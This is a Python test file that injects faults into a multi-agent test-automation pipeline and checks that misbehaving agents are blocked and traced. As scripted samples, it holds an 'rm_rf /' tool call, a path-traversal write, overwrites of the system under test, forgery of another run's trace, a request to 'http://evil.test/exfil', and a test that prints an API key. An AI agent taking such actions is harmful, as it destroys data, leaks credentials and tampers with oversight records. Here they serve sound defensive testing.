"""Spec v3 §10.2 fault-injection scenarios. Each checks behaviour, trace and attribution.

W01 / W03 (test weakening across revision rounds) need the Workflow Evaluator and move to Phase 4.
"""

from __future__ import annotations

from pathlib import Path

from opentelemetry.trace import StatusCode

from agents.contracts import RequirementSpec
from llm.adapters.gemini import GEMINI_RETRY
from permissions.gate import REPO_ROOT
from testing.fake_agent import ToolCall, scripted
from testing.fake_llm import FakeLLM
from testing.fake_provider import OVERLOADED, RATE_LIMITED, FakeProvider
from tools.registry import RetryPolicy, ToolError, ToolTimeoutError

from tests.agent_faults.support import PASSED, llm_script, tree_hash

TIMEOUT_POLICY = RetryPolicy(max_attempts=3, retry_on=(ToolTimeoutError,), backoff_s=1.0)


def _automation(*calls: ToolCall):
    """An automation agent that performs `calls`, then hands QA a normal generated test."""
    from agents.contracts import AutomationResult, GeneratedFile

    return scripted("automation", calls, lambda plan: AutomationResult("REQ-005", (GeneratedFile("generated/test_req005_api.py", "", "api"),)))


# ---------------------------------------------------------------------------------------- tool misuse


def test_hallucinated_tool_is_not_executed(run_scenario):
    s = run_scenario(agents={"automation": _automation(ToolCall("rm_rf", {"path": "/"}))})

    assert s.result.verdict == "AGENT_FAILED"
    assert (s.decided["layer"], s.decided["symptom"], s.decided["matched_rule"]) == ("AGENT", "INVALID_OUTPUT", "R6")
    (span,) = s.spans("tool.rm_rf")
    assert span.status.status_code is StatusCode.ERROR
    (event,) = s.events("INVALID_TOOL_CALL")
    assert event["executed"] is False and event["agent"] == "automation"


def test_missing_tool_arguments_are_rejected_before_execution(run_scenario):
    s = run_scenario(agents={"qa": scripted("qa", [ToolCall("pytest", {})])})

    assert s.tools["pytest"].calls == []
    assert s.decided["matched_rule"] == "R6" and "missing required parameter 'paths'" in s.decided["evidence"]


def test_repeated_failing_call_is_detected_and_aborted(run_scenario):
    call = ToolCall("pytest", {"paths": ["generated/test_req005_api.py"]}, swallow=True)
    s = run_scenario(
        pytest_script=[ToolError("runner crashed")],
        agents={"qa": scripted("qa", [call, call, ToolCall("pytest", {"paths": ["generated/test_req005_api.py"]})])},
    )

    assert len(s.tools["pytest"].calls) == 2  # the third identical request never reached the tool
    assert s.result.verdict == "AGENT_FAILED"
    assert "R6" in s.rules and "already failed 2 times" in s.decided["evidence"]


# ---------------------------------------------------------------------------------------- tool reliability


def test_tool_timeout_then_success_is_flaky(run_scenario):
    s = run_scenario(pytest_script=[ToolTimeoutError("slow"), PASSED], pytest_retry=TIMEOUT_POLICY)

    attempts = sorted(s.spans("attempt"), key=lambda a: a.attributes["qa.retry.attempt"])
    assert [a.status.status_code for a in attempts] == [StatusCode.ERROR, StatusCode.OK]
    assert (s.result.verdict, s.result.underlying_verdict) == ("FLAKY", "PASS")


def test_persistent_timeout_stops_at_the_retry_limit(run_scenario):
    s = run_scenario(pytest_script=[ToolTimeoutError("slow")], pytest_retry=TIMEOUT_POLICY)

    assert len(s.tools["pytest"].calls) == 3 and len(s.spans("attempt")) == 3
    assert s.result.verdict == "TEST_BROKEN"
    assert (s.decided["layer"], s.decided["symptom"], s.decided["matched_rule"]) == ("HARNESS", "TIMEOUT", "R17")


# ---------------------------------------------------------------------------------------- provider / LLM


def test_llm_rate_limit_is_provider_env_blocked(run_scenario):
    provider = FakeProvider([RATE_LIMITED])
    s = run_scenario(provider, llm_retry=GEMINI_RETRY)

    assert provider.models.calls == GEMINI_RETRY.max_attempts  # backed off and retried, then stopped
    assert s.result.verdict == "ENV_BLOCKED"
    assert (s.decided["layer"], s.decided["symptom"], s.decided["matched_rule"]) == ("PROVIDER", "RATE_LIMIT", "R2")


def test_llm_overload_is_provider_env_blocked(run_scenario):
    s = run_scenario(FakeProvider([OVERLOADED]))

    assert s.result.verdict == "ENV_BLOCKED"
    assert (s.decided["layer"], s.decided["symptom"], s.decided["matched_rule"]) == ("PROVIDER", "HTTP_5XX", "R3")


def test_provider_recovers_after_overload_is_flaky(run_scenario):
    s = run_scenario(FakeProvider([OVERLOADED, *llm_script()]), llm_retry=GEMINI_RETRY)

    assert s.result.verdict == "FLAKY" and s.result.underlying_verdict == "PASS"


def test_llm_output_not_json_stops_the_pipeline(run_scenario):
    s = run_scenario(FakeLLM(["this is not json"]))

    assert s.result.verdict == "AGENT_FAILED"
    assert (s.decided["layer"], s.decided["symptom"], s.decided["matched_rule"]) == ("AGENT", "INVALID_OUTPUT", "R5")
    assert s.spans("agent.test_design") == []  # nothing downstream ran


def test_handoff_missing_fields_is_rejected_and_attributed_upstream(run_scenario):
    empty_spec = scripted("requirement", output=lambda inp: RequirementSpec(inp.requirement_id, "summary", ()))
    s = run_scenario(FakeLLM(llm_script()[1:]), agents={"requirement": empty_spec})

    assert s.result.verdict == "AGENT_FAILED"
    assert (s.decided["layer"], s.decided["symptom"], s.decided["matched_rule"]) == ("AGENT", "SCHEMA_MISMATCH", "R7")
    assert s.decided["agent"] == "requirement"  # detected by test_design, attributed to its upstream
    (span,) = s.spans("agent.test_design")
    assert span.status.status_code is StatusCode.ERROR


# ---------------------------------------------------------------------------------------- permissions


def test_qa_agent_may_not_write_files(run_scenario):
    s = run_scenario(agents={"qa": scripted("qa", [ToolCall("file_write", {"path": "generated/test_x.py", "content": "x = 1\n"})])})

    (event,) = s.events("PERMISSION_DENIED")
    assert (event["agent"], event["action"], event["executed"]) == ("qa", "file_write", False)
    assert not (s.workspace / "generated" / "test_x.py").exists()
    assert (s.decided["matched_rule"], s.result.verdict) == ("R18", "AGENT_FAILED")


def test_llm_proposing_a_path_outside_generated_is_stopped_by_output_validation(run_scenario):
    """First layer: the Automation agent only accepts generated/test_*.py from the LLM, so the write
    never reaches a tool (no security event; R5). The gate is the second layer, tested below."""
    before = (REPO_ROOT / "sut" / "app.py").read_bytes()
    s = run_scenario(FakeLLM(llm_script(files=[{"path": "generated/../../../sut/app.py", "surface": "api", "content": "BROKEN"}])))

    assert (s.result.verdict, s.decided["matched_rule"]) == ("AGENT_FAILED", "R5")
    assert s.spans("tool.file_write") == [] and s.events() == []
    assert (REPO_ROOT / "sut" / "app.py").read_bytes() == before


def test_automation_writing_the_real_sut_is_protected_path_and_goal_drift(run_scenario):
    before = (REPO_ROOT / "sut" / "app.py").read_bytes()
    write = ToolCall("file_write", {"path": str(REPO_ROOT / "sut" / "app.py"), "content": "BROKEN"})
    s = run_scenario(agents={"automation": _automation(write)})

    assert [e["type"] for e in s.events()] == ["GOAL_DRIFT", "PROTECTED_PATH_WRITE"]
    assert all(e["executed"] is False for e in s.events())
    assert (REPO_ROOT / "sut" / "app.py").read_bytes() == before
    assert (s.result.verdict, s.decided["matched_rule"]) == ("AGENT_FAILED", "R18")


def test_automation_writing_the_sut_by_repo_relative_path(run_scenario):
    """file_write would place "sut/app.py" under the workspace, but the intent is the real SUT."""
    s = run_scenario(agents={"automation": _automation(ToolCall("file_write", {"path": "sut/app.py", "content": "x"}))})

    assert [e["type"] for e in s.events()] == ["GOAL_DRIFT", "PROTECTED_PATH_WRITE"]
    assert not (s.workspace / "sut").exists()


def test_writing_another_runs_directory_is_evidence_tampering(run_scenario, tmp_dir):
    other = tmp_dir / "artifacts" / "RUN-20200101-000000-0THR"
    other.mkdir(parents=True)
    (other / "trace.json").write_text("{}", encoding="utf-8")
    before = tree_hash(other)
    write = ToolCall("file_write", {"path": f"../{other.name}/trace.json", "content": "{\"forged\": true}"})
    s = run_scenario(agents={"automation": _automation(write)})

    (event,) = s.events("EVIDENCE_TAMPER_ATTEMPT")
    assert event["executed"] is False
    assert tree_hash(other) == before


def test_http_request_to_another_host_is_refused(run_scenario):
    s = run_scenario(agents={"qa": scripted("qa", [ToolCall("http_request", {"method": "GET", "route": "http://evil.test/exfil"})])})

    assert s.tools["http_request"].calls == []
    assert s.events("PERMISSION_DENIED")[0]["target"] == "http://evil.test/exfil"


def test_generated_test_reading_the_api_key_never_runs(run_scenario, monkeypatch):
    """Layer 1: the code policy refuses the file. (Layer 2, the env whitelist that hides GEMINI_API_KEY even
    from code that does run, is tested on its own in tests/tools/test_pytest_isolation.py.)"""
    monkeypatch.setenv("GEMINI_API_KEY", "AIzaSyA1234567890abcdefghijklmnopqrstuv")
    source = "import os\n\n\ndef test_leak():\n    print(os.environ['GEMINI_API_KEY'])\n"
    s = run_scenario(FakeLLM(llm_script(files=[{"path": "generated/test_req005_api.py", "surface": "api", "content": source}])))

    assert s.tools["pytest"].calls == []
    assert s.decided["matched_rule"] == "R18"
    assert "FORBIDDEN_IMPORT import os" in s.events("PERMISSION_DENIED")[0]["evidence"]


def test_every_refusal_is_on_a_span_and_nothing_was_executed(run_scenario):
    s = run_scenario(agents={"qa": scripted("qa", [ToolCall("file_write", {"path": "x.py", "content": ""})])})
    span_events = [e for span in s.spans() for e in span.events if e.name.startswith("security.")]
    assert len(span_events) == len(s.events()) and s.result.security["breach"] is False
    assert Path(s.workspace / "trace.json").is_file()
